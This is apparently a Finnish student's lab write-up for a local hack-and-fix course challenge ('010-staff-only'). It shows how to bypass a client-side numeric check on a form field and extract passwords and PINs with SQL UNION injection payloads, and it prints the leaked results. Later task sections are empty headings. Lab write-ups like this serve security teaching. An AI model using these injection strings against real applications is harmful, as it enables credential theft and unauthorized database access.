# H2 Break & unbreak
## Ympäristö
- Windows 11 PC
- Vmware workstation pro 17
- [Kali linux VMware image](https://www.kali.org/get-kali/#kali-virtual-machines)

## x

## a Murtaudu 010-staff-only. Hack'n Fix
### Tehtävän alustus
Aloitetaan lataamalla tehtävät
```GNOME
wget https://terokarvinen.com/hack-n-fix/teros-challenges.zip
unzip teros-challenges.zip
```
Siirrytään kansioon ja käynnistetään tehtävän verkkosivu
```GNOME
cd challenges/010-staff-only/
python3 staff-only.py
```
![part1](/kuvat/staff-only1.png)
### Ratkaisu
 - Avataan sivu verkkoselaimessa, esim Mozilla firefox http://127.0.0.1:5000/
 - Avataan Element picker **Ctrl+Shift+C**
 - Tutkimalla verkkosivua huomataan, että pinkoodien takana oleva lomake vaatii **numeroita!**
 - Ei hätää, sen voi vaatimuksen voi vain poistaa **web developer toolssissa**
 ![part2](/kuvat/staff-only2.png)
 - Tämän jälkeen lomakeesta voi lähettää stringin!
 - Luin tehtävää varten [portswiggeristä](https://portswigger.net/web-security/sql-injection/union-attacks) artikkelin **UNION** hyökkäyksistä joiden avulla voidaan sql injektiossa lähettää toinen haku sql tietokantaan
 - Piippu operaattorilla | | saadaan lisämausteena korkattua myös pinkoodit salasanojen kanssa  
 ```
 ' UNION SELECT password || '~' || pin FROM pins --
 ```
- Your password is **SUPERADMIN%%rootALL-FLAG{Tero-e45f8764675e4463db969473b6d0fcdd}~11112222333**
- Lisäämällä **LIMIT** operaattori voidaan käydä tietokantaa läpi
```
' UNION SELECT password || '~' || pin FROM pins LIMIT 2,1 --
```
-  foo~321
-  loremipsum~321


## b Korjaa 010-staff-only haavoittuvuus lähdekoodista. Osoita testillä, että ratkaisusi toimii.

## c Ratkaise dirfuzt-1 artikkelista Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf.
### Tehtävän alustus

## d Murtaudu 020-your-eyes-only. Hack'n Fix

## e Korjaa 020-your-eyes-only haavoittuvuus. Osoita testillä, että ratkaisusi toimii.
